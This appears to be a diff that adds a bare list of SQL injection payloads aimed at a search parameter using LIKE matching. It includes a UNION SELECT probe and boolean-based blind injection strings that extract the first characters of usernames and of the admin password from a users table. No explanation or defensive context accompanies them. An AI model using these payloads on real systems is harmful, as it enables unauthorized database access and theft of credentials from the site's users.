@@ -1,0 +1,10 @@
+ i%' UnIOn SELECT 1,2,3,4, 'root 
+
+ i%' and (select '1%')='1 
+
+i%' and ascii(substr((select username from users limit 0,1 ), 1,1))>80 and (select '1%')='1
+
+i%' and (select 1 from users limit 0,1)>0 and (select '1%')='1
+
+
+k%' and ascii(substr((select password from users where username='admin' limit 0,1 ), 1,1))>105 and (select '1%')='1
